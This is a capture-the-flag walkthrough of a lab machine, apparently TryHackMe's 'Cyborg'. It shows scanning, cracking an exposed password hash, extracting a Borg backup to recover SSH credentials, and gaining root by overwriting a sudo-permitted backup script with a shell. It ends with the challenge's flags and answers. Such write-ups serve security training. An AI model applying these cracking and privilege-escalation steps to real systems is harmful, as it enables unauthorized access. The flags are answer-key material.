# Task 1 Deploy the machine
----

>>Please deploy the machine so you can get started. Please allow a few minutes to make sure all the services boot up. Good luck!
>>twitter: fieldraccoon

----

# Task 2 Compromise the System
----

>>Compromise the machine and read the user.txt and root.txt

## SCANNING

```bash
root@ip-10-10-205-252:~# nmap -sC -sV 10.10.92.216

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-09 13:28 GMT
Nmap scan report for ip-10-10-92-216.eu-west-1.compute.internal (10.10.92.216)
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:C6:E1:A2:02:45 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.51 seconds

root@ip-10-10-205-252:~# gobuster dir -u http://10.10.92.216 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.92.216
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/09 13:31:18 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/etc (Status: 301)
/server-status (Status: 403)
===============================================================
2022/01/09 13:31:59 Finished
===============================================================
```

>>Found this file with this url below
>>URL:http://10.10.92.216/etc/passwd

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

>>Found this file with this url below
>>URL:http://10.10.92.216/etc/squid.conf

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

## CRACKING 

>>Cracking the hash we found in the /etc directory of the webpage.

```bash
root@ip-10-10-205-252:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (music_archive)
1g 0:00:00:00 DONE (2022-01-09 13:34) 2.777g/s 108266p/s 108266c/s 108266C/s 112704..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

>>In the admin page there is a downloadable tar file and it is bor backups repo.
>>We found the password for alex with the passphrase we found by cracking.

```bash
root@ip-10-10-205-252:~# tar -xvf archive.tar 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1

root@ip-10-10-205-252:~# cat home/field/dev/final_archive/README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

root@ip-10-10-205-252:~# borg list final_archive
Enter passphrase for key /data/Cyborg/files/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 15:00:38 
[f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

root@ip-10-10-205-252:~# borg list final_archive::music_archive
Enter passphrase for key /data/Cyborg/files/home/field/dev/final_archive: 
drwxr-xr-x alex   alex          0 Tue, 2020-12-29 14:55:52 home/alex
-rw-r--r-- alex   alex       3637 Mon, 2020-12-28 15:25:14 home/alex/.bashrc
-rw-r--r-- alex   alex        220 Mon, 2020-12-28 15:25:14 home/alex/.bash_logout
-rw-r--r-- alex   alex        675 Mon, 2020-12-28 15:25:14 home/alex/.profile
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 19:00:24 home/alex/Music
-rw------- alex   alex        439 Mon, 2020-12-28 18:26:45 home/alex/.bash_history

[REDACTED]

drwx------ root   root          0 Mon, 2020-12-28 17:33:49 home/alex/.config/sublime-text-3/Installed Packages
drwx------ root   root          0 Mon, 2020-12-28 17:33:49 home/alex/.config/ibus
drwx------ root   root          0 Mon, 2020-12-28 17:33:49 home/alex/.config/ibus/bus
drwxrwxr-x alex   alex          0 Tue, 2020-12-29 14:55:52 home/alex/Documents
-rw-r--r-- root   root        110 Tue, 2020-12-29 14:55:41 home/alex/Documents/note.txt
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:59:30 home/alex/Public
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:59:37 home/alex/Videos
drwxrwxr-x alex   alex          0 Tue, 2020-12-29 14:57:14 home/alex/Desktop
-rw-r--r-- root   root         71 Tue, 2020-12-29 14:57:14 home/alex/Desktop/secret.txt
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 18:59:57 home/alex/Downloads
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 19:00:02 home/alex/Templates
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 19:26:44 home/alex/Pictures

root@ip-10-10-205-252:~# borg extract final_archive::music_archive
Enter passphrase for key /data/Cyborg/files/home/field/dev/final_archive: 
kali@kali:/data/Cyborg/files/home/field/dev$ tree home/
home/
└── alex
    ├── Desktop
    │   └── secret.txt
    ├── Documents
    │   └── note.txt
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── Templates
    └── Videos

9 directories, 2 files

root@ip-10-10-205-252:~# cat home/alex/Desktop/secret.txt 
shoutout to all the people who have gotten to this stage whoop whoop!"
kali@kali:/data/Cyborg/files/home/field/dev$ cat home/alex/Documents/note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

## SSH INTO ALEX

>>ssh into alex machine and found the user.txt

```bash
root@ip-10-10-205-252:~# ssh alex@10.10.92.216
alex@10.10.92.216's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

27 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

## PRIVILEGE ESCALATION

>>We can run backup.sh file as root so using the payload 'cat > backup.sh << EOF' and setting the payload in that file then running it with sudo.
>>There we got our root shell. 

```bash 
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

alex@ubuntu:~$ cd /etc/mp3backups/
alex@ubuntu:/etc/mp3backups$ ls
backed_up_files.txt  backup.sh  ubuntu-scheduled.tgz
alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh 
alex@ubuntu:/etc/mp3backups$ cat > backup.sh << EOF
> #!/bin/bash
> /bin/bash
> EOF
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh 
root@ubuntu:/etc/mp3backups# 
root@ubuntu:/etc/mp3backups# cd /root
root@ubuntu:/root# cat root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

----

# ANSWER THE FOLLOWING :
----

1.Deploy the machine
>>No answer needed

2.Scan the machine, how many ports are open?
>>2

3.What service is running on port 22?
>>ssh

4.What service is running on port 80?
>>http

5.What is the user.txt flag?
>>flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

6.What is the root.txt flag?
>>flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
----